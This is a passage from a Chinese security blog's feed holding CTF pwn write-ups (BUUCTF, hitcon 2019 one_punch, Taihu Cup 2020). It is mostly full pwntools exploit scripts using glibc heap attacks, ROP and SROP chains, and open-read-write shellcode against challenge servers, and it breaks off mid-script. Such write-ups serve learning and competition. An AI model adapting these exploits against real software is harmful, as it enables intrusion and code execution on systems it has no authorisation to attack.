class="hljs-string">'libc_base'</span>,libc_base)malloc_hook = <span class="hljs-number">0x3c4aed</span> + libc_basefree(<span class="hljs-number">0</span>)edit(<span class="hljs-number">0</span>,p64(malloc_hook))<span class="hljs-comment"># debug()</span>add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>)add(<span class="hljs-number">0x68</span>,<span class="hljs-string">'1'</span>)one = <span class="hljs-number">0xf0364</span> + libc_baserealloc = libc_base + libc.symbols[<span class="hljs-string">'realloc'</span>] + realloc[<span class="hljs-number">3</span>]payload = <span class="hljs-string">'\x00'</span> *<span class="hljs-number">3</span> + p64(<span class="hljs-number">0</span>)  + p64(one)+ p64(realloc) edit(<span class="hljs-number">10</span>,payload)itr()</code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/3Mu5of.png" srcset="/img/loading.gif" alt></p><h3 id="flag值"><a href="#flag值" class="headerlink" title="flag值"></a>flag值</h3><div class="hljs"><pre><code class="hljs python">flag&#123;ABAFADFKLAFL_FADFKAF_FADFADFI0FACCC&#125;</code></pre></div>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;第六届上海市网络安全邀请赛2020CTF部分wp&quot;&gt;&lt;a href=&quot;#第六届上海市网络安全邀请赛2020CTF部分wp&quot; class=&quot;headerlink&quot; title=&quot;第六届上海市网络安全邀请赛2020CTF部分wp&quot;&gt;&lt;/a&gt;第六届上海市网络安全邀请赛2
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
      <category term="wp" scheme="http://chumen77.xyz/tags/wp/"/>
    
  </entry>
  
  <entry>
    <title>Nov. 刷题记录</title>
    <link href="http://chumen77.xyz/2020/11/12/Nov.%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>http://chumen77.xyz/2020/11/12/Nov.刷题记录/</id>
    <published>2020-11-12T12:59:27.008Z</published>
    <updated>2020-11-18T01:19:07.632Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Nov-刷题记录"><a href="#Nov-刷题记录" class="headerlink" title="Nov.刷题记录"></a>Nov.刷题记录</h1><h2 id="BUUCTF-红包题3"><a href="#BUUCTF-红包题3" class="headerlink" title="BUUCTF 红包题3"></a>BUUCTF 红包题3</h2><p>Tcache Stashing Unlink Attack 练手题。</p><h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><ul><li>uaf</li></ul><p>利用0x400 与 0x300构造出2个0x90的smallbin，进行Tcache Stashing Unlink Attack 即可。</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./RedPacket_SoEasyPwn1'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">29206</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(idx,choice,data)</span>:</span>    sla(<span class="hljs-string">':'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'idx'</span>,str(idx))    sla(<span class="hljs-string">'4.0x400)'</span>,str(choice))    sa(<span class="hljs-string">'content'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">':'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">"idx"</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">':'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">"idx"</span>,str(idx))    sa(<span class="hljs-string">"ent:"</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">':'</span>,<span class="hljs-string">'4'</span>)    sla(<span class="hljs-string">'idx:'</span>,str(idx))<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">6</span>):    add(i,<span class="hljs-number">2</span>,<span class="hljs-string">'chumen77'</span>)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">6</span>):    free(i)  <span class="hljs-comment">#可以不用这样写 直接在上一个循环，free也可以</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">8</span>):    add(i+<span class="hljs-number">7</span>,<span class="hljs-number">4</span>,<span class="hljs-string">'chumen77'</span>)add(<span class="hljs-number">16</span>,<span class="hljs-number">1</span>,<span class="hljs-string">'chumen77'</span>)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">8</span>):    free(i+<span class="hljs-number">7</span>)add(<span class="hljs-number">0</span>,<span class="hljs-number">3</span>,<span class="hljs-string">'chumen77'</span>)add(<span class="hljs-number">1</span>,<span class="hljs-number">4</span>,<span class="hljs-string">'chumen77'</span>)add(<span class="hljs-number">16</span>,<span class="hljs-number">4</span>,<span class="hljs-string">'chumen77'</span>)free(<span class="hljs-number">1</span>)show(<span class="hljs-number">1</span>)r()libcbase = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x1e4ca0</span>info_addr(<span class="hljs-string">'libc'</span>,libcbase)<span class="hljs-comment"># debug()</span>add(<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-string">'chumen77'</span>)add(<span class="hljs-number">3</span>,<span class="hljs-number">3</span>,<span class="hljs-string">'chumen77'</span>)show(<span class="hljs-number">5</span>)r()heapbase = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x1670</span>info_addr(<span class="hljs-string">'heap'</span>,heapbase)payload = <span class="hljs-string">'\x00'</span> * <span class="hljs-number">0x300</span> + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0x101</span>) + p64(heapbase+<span class="hljs-number">0x37e0</span>) + p64(heapbase+<span class="hljs-number">0xa60</span> - <span class="hljs-number">0x10</span>)edit(<span class="hljs-number">1</span>,payload)add(<span class="hljs-number">4</span>,<span class="hljs-number">2</span>,<span class="hljs-string">'chumen77'</span>)pop_rdi = libc.search(asm(<span class="hljs-string">"pop rdi \nret"</span>)).next()  + libcbasepop_rsi = libc.search(asm(<span class="hljs-string">"pop rsi \nret"</span>)).next()  + libcbasepop_rdx = <span class="hljs-number">0x000000000012bda6</span>  + libcbaseleave_ret = libc.search(asm(<span class="hljs-string">"leave \nret"</span>)).next()  + libcbaseopen = libcbase + libc.symbols[<span class="hljs-string">"open"</span>]read = libcbase + libc.symbols[<span class="hljs-string">"read"</span>]puts = libcbase + libc.symbols[<span class="hljs-string">'puts'</span>]rop=flat([pop_rdi,heapbase + <span class="hljs-number">0x4440</span>,pop_rsi,<span class="hljs-number">0</span>,open,pop_rdi,<span class="hljs-number">3</span>,pop_rsi,heapbase + <span class="hljs-number">0x2000</span>,pop_rdx,<span class="hljs-number">0x30</span>,read,pop_rdi,heapbase + <span class="hljs-number">0x2000</span>,puts])sleep(<span class="hljs-number">0.1</span>)add(<span class="hljs-number">5</span>,<span class="hljs-number">4</span>,<span class="hljs-string">'./flag\x00\x00'</span>  + rop)sla(<span class="hljs-string">':'</span>,<span class="hljs-string">'666'</span>)payload = <span class="hljs-string">'\x00'</span> * <span class="hljs-number">0x80</span> + p64(heapbase+<span class="hljs-number">0x4430</span>+<span class="hljs-number">8</span>+<span class="hljs-number">8</span>) + p64(leave_ret)sa(<span class="hljs-string">'to say?'</span>,payload)itr()</code></pre></div><h2 id="hitcon-ctf-2019-one-punch"><a href="#hitcon-ctf-2019-one-punch" class="headerlink" title="hitcon_ctf_2019_one_punch"></a><code>hitcon_ctf_2019_one_punch</code></h2><h3 id="漏洞点-1"><a href="#漏洞点-1" class="headerlink" title="漏洞点"></a>漏洞点</h3><ul><li>uaf</li></ul><p>还是Tcache Stashing Unlink 的练手题。</p><h3 id="注意点"><a href="#注意点" class="headerlink" title="注意点"></a>注意点</h3><div class="hljs"><pre><code class="hljs undefined">line  CODE  JT   JF      K================================= <span class="hljs-number">0000</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000004</span>  A = arch <span class="hljs-number">0001</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0xc000003e</span>  <span class="hljs-keyword">if</span> (A == ARCH_X86_64) goto <span class="hljs-number">0003</span> <span class="hljs-number">0002</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">return</span> KILL <span class="hljs-number">0003</span>: <span class="hljs-number">0x20</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  A = sys_number <span class="hljs-number">0004</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x0000000f</span>  <span class="hljs-keyword">if</span> (A != rt_sigreturn) goto <span class="hljs-number">0006</span> <span class="hljs-number">0005</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x7fff0000</span>  <span class="hljs-keyword">return</span> ALLOW <span class="hljs-number">0006</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x000000e7</span>  <span class="hljs-keyword">if</span> (A != exit_group) goto <span class="hljs-number">0008</span> <span class="hljs-number">0007</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x7fff0000</span>  <span class="hljs-keyword">return</span> ALLOW <span class="hljs-number">0008</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x0000003c</span>  <span class="hljs-keyword">if</span> (A != exit) goto <span class="hljs-number">0010</span> <span class="hljs-number">0009</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x7fff0000</span>  <span class="hljs-keyword">return</span> ALLOW <span class="hljs-number">0010</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x00000002</span>  <span class="hljs-keyword">if</span> (A != open) goto <span class="hljs-number">0012</span> <span class="hljs-number">0011</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x7fff0000</span>  <span class="hljs-keyword">return</span> ALLOW <span class="hljs-number">0012</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">if</span> (A != read) goto <span class="hljs-number">0014</span> <span class="hljs-number">0013</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x7fff0000</span>  <span class="hljs-keyword">return</span> ALLOW <span class="hljs-number">0014</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x00000001</span>  <span class="hljs-keyword">if</span> (A != write) goto <span class="hljs-number">0016</span> <span class="hljs-number">0015</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x7fff0000</span>  <span class="hljs-keyword">return</span> ALLOW <span class="hljs-number">0016</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x0000000c</span>  <span class="hljs-keyword">if</span> (A != brk) goto <span class="hljs-number">0018</span> <span class="hljs-number">0017</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x7fff0000</span>  <span class="hljs-keyword">return</span> ALLOW <span class="hljs-number">0018</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x00000009</span>  <span class="hljs-keyword">if</span> (A != mmap) goto <span class="hljs-number">0020</span> <span class="hljs-number">0019</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x7fff0000</span>  <span class="hljs-keyword">return</span> ALLOW <span class="hljs-number">0020</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x0000000a</span>  <span class="hljs-keyword">if</span> (A != mprotect) goto <span class="hljs-number">0022</span> <span class="hljs-number">0021</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x7fff0000</span>  <span class="hljs-keyword">return</span> ALLOW <span class="hljs-number">0022</span>: <span class="hljs-number">0x15</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x01</span> <span class="hljs-number">0x00000003</span>  <span class="hljs-keyword">if</span> (A != close) goto <span class="hljs-number">0024</span> <span class="hljs-number">0023</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x7fff0000</span>  <span class="hljs-keyword">return</span> ALLOW <span class="hljs-number">0024</span>: <span class="hljs-number">0x06</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00</span> <span class="hljs-number">0x00000000</span>  <span class="hljs-keyword">return</span> KILL</code></pre></div><p>其是运行open，但是libc2.29下走open时，其实则调用openat。<br>可以用set rax = 2 ，syscall  即可。</p><p>free hook打的话，可以用：</p><div class="hljs"><pre><code class="hljs undefined"># <span class="hljs-number">0x000000000012be97</span>: <span class="hljs-keyword">mov</span> <span class="hljs-built_in">rdx</span>, <span class="hljs-built_in">qword</span> <span class="hljs-built_in">ptr</span> [<span class="hljs-built_in">rdi</span> + <span class="hljs-number">8</span>]<span class="hljs-comment">; mov rax, qword ptr [rdi]; mov rdi, rdx; jmp rax;</span></code></pre></div><p>这个好用的gadget，然后srop打orw</p><p>malloc hook打的话，可以用：</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-keyword">add</span><span class="bash"> rsp,0x48 ; ret</span></code></pre></div><p>其也就是栈劫持到可控的buf区，走orw的rop chain</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./hitcon_ctf_2019_one_punch'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">1</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'node3.buuoj.cn'</span>,<span class="hljs-number">29942</span>)    libc = elf.libc    <span class="hljs-comment">#libc = ELF('.')</span>context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]realloc = [<span class="hljs-number">0x2</span>,<span class="hljs-number">0x4</span>,<span class="hljs-number">0x6</span>,<span class="hljs-number">0xB</span>,<span class="hljs-number">0xC</span>,<span class="hljs-number">0xD</span>]arae16 = <span class="hljs-number">0x3c4b78</span>arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">add</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'1'</span>)    sla(<span class="hljs-string">'idx'</span>,str(idx))    sa(<span class="hljs-string">'name'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">edit</span><span class="hljs-params">(idx,data)</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'2'</span>)    sla(<span class="hljs-string">'idx'</span>,str(idx))    sa(<span class="hljs-string">'name'</span>,str(data))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">show</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'3'</span>)    sla(<span class="hljs-string">'idx'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">free</span><span class="hljs-params">(idx)</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'4'</span>)    sla(<span class="hljs-string">'idx'</span>,str(idx))<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">backdoor</span><span class="hljs-params">(data)</span>:</span>    sla(<span class="hljs-string">'&gt;'</span>,<span class="hljs-string">'50056'</span>)    s(str(data))add(<span class="hljs-number">0</span>,<span class="hljs-string">'1'</span>*<span class="hljs-number">0x400</span>)free(<span class="hljs-number">0</span>)<span class="hljs-comment"># debug()</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">6</span>):    edit(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>)    free(<span class="hljs-number">0</span>)add(<span class="hljs-string">'1'</span>,<span class="hljs-string">'1'</span>*<span class="hljs-number">0xd0</span>)edit(<span class="hljs-number">0</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>)free(<span class="hljs-number">0</span>)show(<span class="hljs-number">0</span>)ru(<span class="hljs-string">'name: '</span>)libcbase = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x1e4ca0</span>info_addr(<span class="hljs-string">'libc'</span>,libcbase)add(<span class="hljs-number">2</span>,<span class="hljs-string">'1'</span>*(<span class="hljs-number">0x320</span>))add(<span class="hljs-number">2</span>,<span class="hljs-string">'1'</span>*(<span class="hljs-number">0x320</span>))free(<span class="hljs-number">1</span>)<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">5</span>):    edit(<span class="hljs-number">1</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>)    free(<span class="hljs-number">1</span>)show(<span class="hljs-number">1</span>)ru(<span class="hljs-string">'name: '</span>)heap = uu64(r(<span class="hljs-number">6</span>)) - <span class="hljs-number">0x670</span> info_addr(<span class="hljs-string">'heap'</span>,heap)add(<span class="hljs-number">1</span>,<span class="hljs-string">'1'</span>*(<span class="hljs-number">0x320</span>))add(<span class="hljs-number">1</span>,<span class="hljs-string">'1'</span>*<span class="hljs-number">0x217</span>)free(<span class="hljs-number">1</span>)edit(<span class="hljs-number">1</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>)free(<span class="hljs-number">1</span>)free_hook = <span class="hljs-number">0x1e75a8</span> + libcbase__malloc_hook = <span class="hljs-number">0x1e4c30</span> + libcbaseedit(<span class="hljs-number">1</span>,p64(free_hook))<span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">8</span>):    edit(<span class="hljs-number">2</span>,p64(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>)    free(<span class="hljs-number">2</span>)<span class="hljs-comment"># debug()</span>add(<span class="hljs-number">1</span>,<span class="hljs-string">'1'</span>*(<span class="hljs-number">0x240</span>))add(<span class="hljs-number">1</span>,<span class="hljs-string">'1'</span>*(<span class="hljs-number">0x240</span>))data = <span class="hljs-string">'\x00'</span> * (<span class="hljs-number">0x240</span>) + p64(<span class="hljs-number">0</span>) + p64(<span class="hljs-number">0xe1</span>) + p64(heap+<span class="hljs-number">0x580</span>) + p64(heap + <span class="hljs-number">0x20</span>)edit(<span class="hljs-number">2</span>,data)add(<span class="hljs-number">1</span>,<span class="hljs-string">'1'</span>*<span class="hljs-number">0xd0</span>)add(<span class="hljs-number">2</span>,<span class="hljs-string">'1'</span>*<span class="hljs-number">0x217</span>)add(<span class="hljs-number">1</span>,<span class="hljs-string">'1'</span>*<span class="hljs-number">0x217</span>)frame = SigreturnFrame()frame.rdi = <span class="hljs-number">0</span>frame.rsi = free_hook + <span class="hljs-number">0x20</span>frame.rdx = <span class="hljs-number">0x200</span>frame.rsp = free_hook + <span class="hljs-number">0x20</span>frame.rip = libcbase + libc.search(asm(<span class="hljs-string">"syscall \nret"</span>)).next()srop = str(frame)[<span class="hljs-number">0x10</span>:]<span class="hljs-comment"># debug()</span><span class="hljs-comment"># 0x000000000012be97: mov rdx, qword ptr [rdi + 8]; mov rax, qword ptr [rdi]; mov rdi, rdx; jmp rax; </span>magic =<span class="hljs-number">0x000000000012be97</span> + libcbase backdoor(p64(magic))backdoor(p64(magic))sleep(<span class="hljs-number">0.1</span>)orw = shellcraft.open(<span class="hljs-string">'./flag'</span>) + shellcraft.read(<span class="hljs-number">3</span>,free_hook+<span class="hljs-number">0x60</span>,<span class="hljs-number">0x30</span>) + shellcraft.write(<span class="hljs-number">1</span>,free_hook+<span class="hljs-number">0x60</span>,<span class="hljs-number">0x30</span>)pop_rdi = libc.search(asm(<span class="hljs-string">"pop rdi \nret"</span>)).next() +libcbasepop_rsi = libc.search(asm(<span class="hljs-string">"pop rsi \nret"</span>)).next() +libcbasepop_rdx = libcbase+<span class="hljs-number">0x000000000012bda6</span>rop = flat([pop_rdi,free_hook &amp; <span class="hljs-number">0xfffffffffffff000</span>,pop_rsi,<span class="hljs-number">0x1000</span>,pop_rdx,<span class="hljs-number">7</span>,libc.sym[<span class="hljs-string">'mprotect'</span>]+ libcbase,free_hook + <span class="hljs-number">0x20</span> + <span class="hljs-number">8</span> * <span class="hljs-number">8</span>])payload = p64(libcbase + libc.sym[<span class="hljs-string">'setcontext'</span>]+<span class="hljs-number">53</span>) + p64(heap+<span class="hljs-number">0x260</span>) + sropedit(<span class="hljs-number">0</span>,payload)debug()free(<span class="hljs-number">0</span>)payload = rop + asm(orw)s(payload)itr()</code></pre></div><p>或者是：</p><div class="hljs"><pre><code class="hljs python">add_rsp_0x48 = <span class="hljs-number">0x000000000008cfd6</span> +libcbasebackdoor(p64(add_rsp_0x48))backdoor(p64(add_rsp_0x48))pop_rdi = libc.search(asm(<span class="hljs-string">"pop rdi \nret"</span>)).next()  + libcbasepop_rsi = libc.search(asm(<span class="hljs-string">"pop rsi \nret"</span>)).next()  + libcbasepop_rdx = <span class="hljs-number">0x000000000012bda6</span>  + libcbaseleave_ret = libc.search(asm(<span class="hljs-string">"leave \nret"</span>)).next()  + libcbasepop_rax = <span class="hljs-number">0x0000000000047cf8</span>+ libcbasesyscall_ret = libc.search(asm(<span class="hljs-string">"syscall \nret"</span>)).next()  + libcbase open = libcbase + libc.symbols[<span class="hljs-string">"open"</span>]read = libcbase + libc.symbols[<span class="hljs-string">"read"</span>]write = libcbase + libc.symbols[<span class="hljs-string">'write'</span>]rop=flat([pop_rdi,heap+<span class="hljs-number">0x1440</span>,pop_rsi,<span class="hljs-number">0</span>,pop_rax,<span class="hljs-number">2</span>,syscall_ret,pop_rdi,<span class="hljs-number">3</span>,pop_rsi,heap + <span class="hljs-number">0x2000</span>,pop_rdx,<span class="hljs-number">0x30</span>,read,pop_rdi,<span class="hljs-number">1</span>,pop_rsi,heap + <span class="hljs-number">0x2000</span>,pop_rdx,<span class="hljs-number">0x30</span>,write])sleep(<span class="hljs-number">0.1</span>)edit(<span class="hljs-number">1</span>,<span class="hljs-string">'./flag\x00'</span>)<span class="hljs-comment"># debug()</span>add(<span class="hljs-number">1</span>,rop)</code></pre></div>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Nov-刷题记录&quot;&gt;&lt;a href=&quot;#Nov-刷题记录&quot; class=&quot;headerlink&quot; title=&quot;Nov.刷题记录&quot;&gt;&lt;/a&gt;Nov.刷题记录&lt;/h1&gt;&lt;h2 id=&quot;BUUCTF-红包题3&quot;&gt;&lt;a href=&quot;#BUUCTF-红包题3&quot; class
      
    
    </summary>
    
    
      <category term="pwn" scheme="http://chumen77.xyz/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>太湖杯ctf2020部分wp</title>
    <link href="http://chumen77.xyz/2020/11/08/%E5%A4%AA%E6%B9%96%E6%9D%AFctf2020%E9%83%A8%E5%88%86wp/"/>
    <id>http://chumen77.xyz/2020/11/08/太湖杯ctf2020部分wp/</id>
    <published>2020-11-08T06:19:45.019Z</published>
    <updated>2020-11-08T15:00:20.692Z</updated>
    
    <content type="html"><![CDATA[<h1 id="太湖杯ctf2020部分wp"><a href="#太湖杯ctf2020部分wp" class="headerlink" title="太湖杯ctf2020部分wp"></a>太湖杯ctf2020部分wp</h1><h2 id="seven-hero"><a href="#seven-hero" class="headerlink" title="seven hero"></a>seven hero</h2><p>手快，拿了个三血。还是挺开心的🤣<br><img src="http://qiqianyun.chumen77.xyz/uPic/ETgpbq.png" srcset="/img/loading.gif" alt></p><ul><li>realloc size 0 制造出free效果，配合del函数，达成uaf</li><li>利用libc 2.29的fastbin 的stash机制，完成tcache attack</li></ul><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><span class="hljs-comment"># encoding: utf-8</span><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./pwn'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'119.3.89.93'</span>,<span class="hljs-number">8014</span>)    <span class="hljs-comment"># libc = elf.libc</span>    libc = ELF(<span class="hljs-string">'./libc.so.6'</span>)context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span 